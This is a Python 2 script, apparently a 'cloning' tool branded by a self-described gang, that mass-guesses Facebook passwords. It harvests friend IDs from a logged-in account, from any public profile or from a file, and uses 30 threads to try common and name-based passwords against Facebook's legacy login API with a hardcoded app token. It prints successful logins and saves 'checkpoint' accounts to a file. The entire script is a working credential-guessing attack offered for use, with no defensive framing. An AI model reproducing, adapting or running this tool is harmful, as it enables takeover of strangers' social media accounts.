#!coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
 

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def hamza(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)
##### LOGO #####
logo = """
\033[1;92m___  ____   _ _____ _   __  ___   _   _ 
\033[1;92m|  \/  | | | /  ___| | / / / _ \ | \ | |
\033[1;92m| .  . | | | \ `--.| |/ / / /_\ \|  \| |
\033[1;92m| |\/| | | | |`--. \    \ |  _  || . ` |
\033[1;92m| |  | | |_| /\__/ / |\  \| | | || |\  |
\033[1;92m\_|  |_/\___/\____/\_| \_/\_| |_/\_| \_/ 
\033[1;97m=======================================
\033[1;91mOwNeR  \033[1;93m: \033[1;94mJAM SHAHRUKH X MUSKAN NOOR
\033[1;91mYouTube \033[1;93m: \033[1;94mJAM SHAHRUKH TECHNICAL
\033[1;91mGitHub  \033[1;93m: \033[1;94mhttps://github.com/muskanckg
\033[1;91mGang \033[1;93m: \033[1;94mCRAZY KING GANG
\033[1;97m======================================="""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		
		print("\r\033[1;96m \x1b[1;93mPlease Wait \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
print "\033[1;97m ========================================="
print  """\033[1;97m=======================================
\033[1;91mOwNeR  \033[1;93m: \033[1;94mJAM SHAHRUKH X MUSKAN NOOR
\033[1;91mYouTube \033[1;93m: \033[1;94mJAM SHAHRUKH TECHNICAL
\033[1;91mGitHub  \033[1;93m: \033[1;94mhttps://github.com/muskanckg
\033[1;91mGang \033[1;93m: \033[1;94mCRAZY KING GANG
\033[1;97m======================================="""
print " \x1b[1;97m=========================================="
CorrectUsername = "Fareed"
CorrectPassword = "King"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
def methodlogin():
	os.system('clear')
	print logo
	print "[1] Login With ID/Password."
	print "[2] Login Using Token."
	print "[3] Exit."
	print ('      ')
	hos = raw_input("\nChoose Option >>  ")
	if hos =="":
		print"[!]  Wrong Input"
		exit()
	elif hos =="1":
		login()
	elif hos =="2":
		os.system('clear')
		print logo
		hosp = raw_input("[+] Give Token : ")
		tik()
		hopa = open('login.txt','w')
		hopa.write(hosp)
		hopa.close()
		print "\n[✓] Logged In Successfully."
		time.sleep(1)
		os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
		menu()
	elif hos =="0":
		exit()
	else:
		print"[!] Wrong Input"
		exit()
def login():
	os.system("clear")
	try:
		tb=open('login.txt', 'r')
		os.system("python2 .hop2.py")
	except (KeyError,IOError):
		os.system("clear")
		print (logo)
		hamza('[+] Login Your Facebook Account')
		hamza('[!] Donot Use Your Personal Account')
		hamza('[!] Use a New Facebook Account To Login')
		print'-------------------------------------'
		iid=raw_input('[+] Number/Email: ')
		id=iid.replace(" ","")
		pwd=raw_input('[+] Password : ')
		tik()
		data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		z=json.load(data)
		if 'access_token' in z:
		    st = open("login.txt", "w")
		    st.write(z["access_token"])
		    st.close()
		    print "\n[✓] Logged In Successfully."
		    time.sleep(1)
		    os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
		    os.system("clear")
		    menu()
		else:
		    if "www.facebook.com" in z["error_msg"]:
		        print ('[!] User Must Verify Account Before Login.')
		        time.sleep(3)
		        login()
		    else:
		        print ('[!]Number/User Id/ Password Is Wrong !')
		        time.sleep(1)
		        login()
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m \033[1;91mIt seems that your account has a checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m \x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print " MUSKAN QUEEN OF FACEBOOK "
	print 42*"\033[1;96m="
	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH JAM"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
	pilih()
def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m \x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m \x1b[1;91mFill in correctly"
		pilih()
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ACCOUNT"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
	pilih_super()
def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m \x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;93m[✺] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
			
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m \033[1;93mEnter ID \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m \033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m \x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		print"\033[1;35;40m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;96m \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m \x1b[1;91mFile Not Found'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m \x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;96m \033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;96m \033[1;93mStarting \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;96m \x1b[1;93mTo Stop Process Press CTRL Then Press z ')
	print 42*"\033[1;96m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = 'pubglover'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'freefirepakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '111'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'freefire12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '112233'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '@@@'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
													                             
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m \033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92m THANKS FOR USING MY COMMAND ! WE WILL RIGHT BACK  \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()
if __name__ == '__main__':
	methodlogin()
